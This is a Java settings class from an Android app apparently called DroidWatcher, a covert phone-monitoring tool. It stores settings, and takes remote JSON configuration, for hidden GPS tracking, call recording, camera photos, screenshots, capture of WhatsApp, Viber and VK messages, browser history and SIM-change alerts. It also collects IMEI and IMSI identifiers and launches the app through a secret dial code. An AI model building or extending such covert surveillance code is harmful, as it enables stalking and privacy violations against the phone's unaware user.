package com.droidwatcher;

import java.util.Date;
import java.util.Iterator;
import java.util.Locale;

import org.acra.ACRA;
import org.json.JSONException;
import org.json.JSONObject;

import com.droidwatcher.lib.TelephonyInfo;
import com.stericson.RootTools.RootTools;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.preference.PreferenceManager;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;

public class SettingsManager {
	private SharedPreferences settings;
	private Context mContext;
	
	private static final String EMPTY_STRING = "";
	
	public static final String KEY_IMEI = "IMEI";
	public static final String KEY_BROWSER_HISTORY = "BROWSER_HISTORY_ENABLED";
	
	public SettingsManager(Context context){
		this.settings = PreferenceManager.getDefaultSharedPreferences(context);
		this.mContext = context;
	}
	
	/** remove all settings */
	public void clear(){
		Editor editor = settings.edit();
		editor.clear();
		editor.commit();
	}
	
	public void remove(String key){
		Editor editor = settings.edit();
		editor.remove(key);
		editor.commit();
	}
	
	public String login(){
		return settings.getString("LOGIN", EMPTY_STRING).toLowerCase(Locale.US);
	}
	public String imei(){
		String imei = settings.getString(KEY_IMEI, null);
		
		if (imei == null) {
			imei = getDeviceId();
		}
		
		return imei;
	}
	public String imsi(){
		String imsi = settings.getString("IMSI", null);
		
		if (imsi == null) {
			imsi = getDeviceIMSI();
		}
		
		return imsi;
	}
	public Boolean isConnected(){
		return settings.getBoolean("CONNECTED", false);
	}
	
	public Boolean isAutoupdateEnabled(){
		return settings.getBoolean("AUTOUPDATE", true);
	}
	
	public Boolean isGpsTrackingEnabled(){
		return settings.getBoolean("USE_GPS", false);
	}
	public Boolean isGpsHidden(){
		return settings.getBoolean("GPS_HIDDEN", true);
	}
	public long gpsInterval(){
		String val = settings.getString("GPS_TIMER", "10");
		return Long.parseLong(val) * 60 * 1000L;
	}
	public Boolean gpsOnlyNew(){
		return settings.getBoolean("GPS_ONLY_NEW", true);
	}
	
	public String runCode(){
		String code = settings.getString("APP_RUN_CODE", "001");
		if (code.length() == 0){
			code = "001";
		}
		return "**" + code + "**";
	}
	public String notifyNumber(){
		return settings.getString("NOTIFY_NUMBER", EMPTY_STRING);
	}
	public Boolean isSimChangeNotificationEnabled(){
		return settings.getBoolean("NOTIFY_SIM_CHANGE", false);
	}
	public Boolean notifySms(){
		return settings.getBoolean("NOTIFY_SMS", false);
	}
	public Boolean notifyCall(){
		return settings.getBoolean("NOTIFY_CALL", false);
	}
	public Boolean isFilterEnabled(){
		return settings.getBoolean("FILTER_USE", false);
	}
	public String filterType(){
		return settings.getString("FILTER_TYPE", "0");
	}
	public String filterList(){
		return settings.getString("FILTER_LIST", EMPTY_STRING);
	}
	public Boolean isNumberFiltered(String number){
		String list = settings.getString("FILTER_LIST", EMPTY_STRING);
		Boolean inList = false;
		
		if (list.indexOf(number) != -1){
			inList = true;
		}
		String type = settings.getString("FILTER_TYPE", "0");
		if (type.equals("0")){
			return !inList;
		}
		else{
			return inList;
		}
	}
	public Boolean onlyWiFi(){
		return settings.getBoolean("ONLY_WIFI", false);
	}
	public Boolean filesOnlyWiFi(){
		return settings.getBoolean("FILES_ONLY_WIFI", true);
	}
	public Boolean isRecordEnabled(){
		return settings.getBoolean("RECORD_CALLS", false);
	}
	public int recordFormat(){
		return Integer.parseInt(settings.getString("RECORD_FORMAT", "1"));
	}
	public int recordSource(){
		return Integer.parseInt(settings.getString("RECORD_SOURCE", "1"));
	}
	
	public Boolean isPhotoCaptureEnabled(){
		return settings.getBoolean("CAPTURE_PHOTO", false);
	}
	public int capturePhotoSize(){
		String stringSize = settings.getString("CAPTURE_PHOTO_FORMAT", "640");
		return Integer.parseInt(stringSize);
	}
	
	public Boolean isScreenshotEnabled(){
		return settings.getBoolean("SCREENSHOT_ENABLED", false);
	}
	public long screenshotInterval(){
		String val = settings.getString("SCREENSHOT_INTERVAL", "60");
		return Long.parseLong(val) * 1000L;
	}
	public int screenshotSize(){
		String stringSize = settings.getString("SCREENSHOT_PHOTO_FORMAT", "640");
		return Integer.parseInt(stringSize);
	}
	
	public Boolean isVkEnabled(){
		return settings.getBoolean("VK_ENABLED", false);
	}
	
	public Boolean isWhatsAppEnabled(){
		return settings.getBoolean("WA_ENABLED", false);
	}
	
	public Boolean isViberEnabled(){
		return settings.getBoolean("VB_ENABLED", false);
	}
	
	public Boolean isFrontCameraEnabled(){
		return settings.getBoolean("FRONT_CAMERA_ENABLED", false);
	}
	
	public Boolean isBrowserHistoryEnabled(){
		return settings.getBoolean(KEY_BROWSER_HISTORY, false);
	}
	
	/*
	 * Edit
	 */
	public void isBrowserHistoryEnabled(Boolean enabled){
		editSettings(KEY_BROWSER_HISTORY, enabled);
	}
	
	public void isFrontCameraEnabled(Boolean enabled){
		editSettings("FRONT_CAMERA_ENABLED", enabled);
	}
	
	public void isViberEnabled(Boolean enabled){
		editSettings("VB_ENABLED", enabled);
	}
	
	public void isWhatsAppEnabled(Boolean enabled){
		editSettings("WA_ENABLED", enabled);
	}
	
	public void isVkEnabled(Boolean enabled){
		editSettings("VK_ENABLED", enabled);
	}
	
	public void recordCalls(Boolean record){
		editSettings("RECORD_CALLS", record);
	}
	public void imsi(String imsi){
		editSettings("IMSI", imsi);
	}
	public void isAutoupdateEnabled(Boolean enabled){
		editSettings("AUTOUPDATE", enabled);
	}
	
	public void runCode(String code){
		editSettings("APP_RUN_CODE", code);
	}
	public void notifyNumber(String number){
		editSettings("NOTIFY_NUMBER", number);
	}
	public void isSimChangeNotificationEnabled(Boolean enabled){
		editSettings("NOTIFY_SIM_CHANGE", enabled);
	}
	public void notifySms(Boolean notify){
		editSettings("NOTIFY_SMS", notify);
	}
	public void notifyCall(Boolean notify){
		editSettings("NOTIFY_CALL", notify);
	}
	
	public void onlyWiFi(Boolean val){
		editSettings("ONLY_WIFI", val);
	}
	public void filesOnlyWiFi(Boolean val){
		editSettings("FILES_ONLY_WIFI", val);
	}
	public void isRecordEnabled(Boolean val){
		editSettings("RECORD_CALLS", val);
	}
	public void recordFormat(String format){
		editSettings("RECORD_FORMAT", format);
	}
	public void recordSource(String source){
		editSettings("RECORD_SOURCE", source);
	}
	
	public void isPhotoCaptureEnabled(Boolean val){
		editSettings("CAPTURE_PHOTO", val);
	}
	public void capturePhotoSize(String val){
		editSettings("CAPTURE_PHOTO_FORMAT", val);
	}
	
	public void isScreenshotEnabled(Boolean val){
		editSettings("SCREENSHOT_ENABLED", val);
	}
	public void screenshotInterval(String val){
		editSettings("SCREENSHOT_INTERVAL", val);
	}
	public void screenshotSize(String val){
		editSettings("SCREENSHOT_PHOTO_FORMAT", val);
	}
	
	public void isGpsTrackingEnabled(Boolean use){
		editSettings("USE_GPS", use);
	}
	public void isGpsHidden(Boolean hidden){
		editSettings("GPS_HIDDEN", hidden);
	}
	public void gpsInterval(String interval){
		editSettings("GPS_TIMER", interval);
	}
	public void gpsOnlyNew(Boolean val){
		editSettings("GPS_ONLY_NEW", val);
	}
	
	public void login(String login){
		editSettings("LOGIN", login.toLowerCase(Locale.US));
	}
	public void connected(Boolean connected){
		editSettings("CONNECTED", connected);
	}
	public void useFilter(Boolean use){
		editSettings("FILTER_USE", use);
	}
	public void filterType(String type){
		editSettings("FILTER_TYPE", type);
	}
	public void filterAdd(String number){
		String list = settings.getString("FILTER_LIST", "");
		if (list.indexOf(number) != -1){
			return;
		}
		
		if (list.length() > 0){
			list += ",";
		}
		list += number;
		
		editSettings("FILTER_LIST", list);
	}
	public void filterDel(String number){
		String list = settings.getString("FILTER_LIST", EMPTY_STRING);
		list = list.replaceAll("," + number, EMPTY_STRING).replaceAll(number, EMPTY_STRING);
		if (list.length() > 0 && list.charAt(0) == ','){
			list = list.replaceFirst(",", EMPTY_STRING);
		}
		editSettings("FILTER_LIST", list);
	}
	
	private void editSettings(String name, String param) {
		Editor editor = settings.edit();
		editor.putString(name, param);
		editor.commit();
	}
	private void editSettings(String name, Boolean param){
		Editor editor = settings.edit();
		editor.putBoolean(name, param);
		editor.commit();
	}
	
	private String getDeviceId(){
		String id = null;
		
		try {
			TelephonyInfo telephonyInfo = TelephonyInfo.getInstance(mContext);
			id = telephonyInfo.getImeiSIM1();
			if (telephonyInfo.isDualSIM()) {
				id = "DUAL_" + telephonyInfo.getImeiSIM1() + "_" + telephonyInfo.getImeiSIM2();
			}	
			
			if (id == null || id.length() == 0){
				String androidId = Secure.getString(mContext.getContentResolver(), Secure.ANDROID_ID);
				
				if (androidId == null || androidId.length() == 0 || androidId.equals("9774d56d682e549c")) {
					String serial = android.os.Build.class.getField("SERIAL").toString();
					
					if (serial.length() == 0) {
						throw new Exception("No IMEI, Secure.ANDROID_ID or Build.SERIAL");
					}
					
					id = "SERIAL_" + serial;
				}
				else{
					id = "ID_" + androidId;
				}
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			
			id = "NOIMEI_" + new Date().getTime();
			
		} finally{
			Editor editor = settings.edit();
			editor.putString(KEY_IMEI, id);
			editor.commit();
		}
		
		return id;
	}
	
	private String getDeviceIMSI(){
		TelephonyManager tm = (TelephonyManager)mContext.getSystemService(Context.TELEPHONY_SERVICE);
		String id = null;
        if (tm != null){
        	id = tm.getSubscriberId();
        }
        
        if (id == null || id.length() == 0){
        	id = "0";
        }
		
		return id;
	}
	
	public JSONObject getJSON(){
		JSONObject obj = new JSONObject();
		try {
			obj.put("onlywifi", onlyWiFi());
			obj.put("onlywifi_files", filesOnlyWiFi());
			obj.put("autoupdate", isAutoupdateEnabled());
			
			obj.put("gps", isGpsTrackingEnabled());
			obj.put("gps_interval", gpsInterval() / 60 / 1000);
			obj.put("gps_onlynew", gpsOnlyNew());
			obj.put("gps_hidden", isGpsHidden());
			
			obj.put("runcode", runCode().replaceAll("\\*", EMPTY_STRING));
			
			obj.put("notify", isSimChangeNotificationEnabled());
			obj.put("notify_number", notifyNumber());
			obj.put("notify_sms", notifySms());
			obj.put("notify_call", notifyCall());
			
			obj.put("record", isRecordEnabled());
			obj.put("record_format",recordFormat());
			obj.put("record_source",recordSource());
			
			obj.put("photo", isPhotoCaptureEnabled());
			obj.put("photo_size",capturePhotoSize());
			
			obj.put("screen", isScreenshotEnabled());
			obj.put("screen_size",screenshotSize());
			obj.put("screen_interval",screenshotInterval() / 1000);
			
			obj.put("vk", isVkEnabled());
			
			obj.put("wa", isWhatsAppEnabled());
			
			obj.put("vb", isViberEnabled());
			
			obj.put("front_camera", isFrontCameraEnabled());
			
			obj.put("browser", isBrowserHistoryEnabled());
			
		} catch (JSONException e) {
			e.printStackTrace();
		}
		return obj;
	}
	
	public void parseSettings(JSONObject obj){
		Iterator<?> keys = obj.keys();
		while (keys.hasNext()) {
			String key = (String) keys.next();
			setSettings(key, obj);
		}
	}
	
	private void setSettings(String key, JSONObject obj){
		try{
			if (key.equals("onlywifi")) {
				onlyWiFi(obj.getBoolean(key));
				return;
			}
			if (key.equals("onlywifi_files")) {
				filesOnlyWiFi(obj.getBoolean(key));
				return;
			}
			
			if (key.equals("gps")) {
				isGpsTrackingEnabled(obj.getBoolean(key));
				return;
			}
			if (key.equals("gps_interval")) {
				gpsInterval(obj.getString(key));
				return;
			}
			if (key.equals("gps_onlynew")) {
				gpsOnlyNew(obj.getBoolean(key));
				return;
			}
			if (key.equals("gps_hidden")) {
				isGpsHidden(obj.getBoolean(key));
				return;
			}
			
			if (key.equals("runcode")) {
				runCode(obj.getString(key));
				return;
			}
			
			if (key.equals("notify")) {
				isSimChangeNotificationEnabled(obj.getBoolean(key));
				return;
			}
			if (key.equals("notify_number")) {
				notifyNumber(obj.getString(key));
				return;
			}
			if (key.equals("notify_sms")) {
				notifySms(obj.getBoolean(key));
				return;
			}
			if (key.equals("notify_call")) {
				notifyCall(obj.getBoolean(key));
				return;
			}
			
			if (key.equals("record")) {
				isRecordEnabled(obj.getBoolean(key));
				return;
			}
			if (key.equals("record_format")) {
				recordFormat(obj.getString(key));
				return;
			}
			if (key.equals("record_source")) {
				recordSource(obj.optString(key, "1"));
				return;
			}
			
			if (key.equals("photo")) {
				isPhotoCaptureEnabled(obj.getBoolean(key));
				return;
			}
			if (key.equals("photo_size")) {
				capturePhotoSize(obj.getString(key));
				return;
			}
			
			if (key.equals("front_camera")) {
				isFrontCameraEnabled(obj.getBoolean(key));
				return;
			}
			
			if (key.equals("browser")) {
				isBrowserHistoryEnabled(obj.getBoolean(key));
				return;
			}
			
			/* ROOT */
			if (RootTools.isRootAvailable() && RootTools.isAccessGiven()) {
				if (key.equals("autoupdate")) {
					isAutoupdateEnabled(obj.getBoolean(key));
					return;
				}
				
				if (key.equals("screen")) {
					isScreenshotEnabled(obj.getBoolean(key));
					return;
				}
				if (key.equals("screen_interval")) {
					screenshotInterval(obj.getString(key));
					return;
				}
				if (key.equals("screen_size")) {
					screenshotSize(obj.getString(key));
					return;
				}
				
				if (key.equals("vk")) {
					isVkEnabled(obj.getBoolean(key));
					return;
				}
				
				if (key.equals("wa")) {
					isWhatsAppEnabled(obj.getBoolean(key));
					return;
				}
				
				if (key.equals("vb")) {
					isViberEnabled(obj.getBoolean(key));
					return;
				}
			}
		}
		catch(Exception e){
			e.printStackTrace();
		}
	}
}
